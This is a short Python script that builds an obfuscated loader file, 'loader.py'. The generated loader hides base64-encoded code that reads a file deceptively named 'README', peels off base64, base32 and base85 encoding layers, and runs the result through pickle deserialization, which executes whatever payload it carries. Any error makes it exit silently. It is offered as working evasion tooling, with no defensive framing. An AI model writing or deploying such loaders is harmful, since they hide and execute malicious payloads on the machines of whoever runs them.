from base64 import b64encode
s = """
try:
    f = open("README", "rb")
    res = load(f)
    res = b64decode(res)
    res = b32decode(res)
    res = b85decode(res)
    loads(res)
except BaseException as e:
    exit()
"""
s = b64encode(s.encode("gbk"))

f = open("loader.py", "w")
f.write(f"""
from pickle import loads, load
from base64 import b64decode, b32decode, b85decode
import ctypes
s = {s}
exec(b64decode(s).decode("gbk"))
""")
f.close()
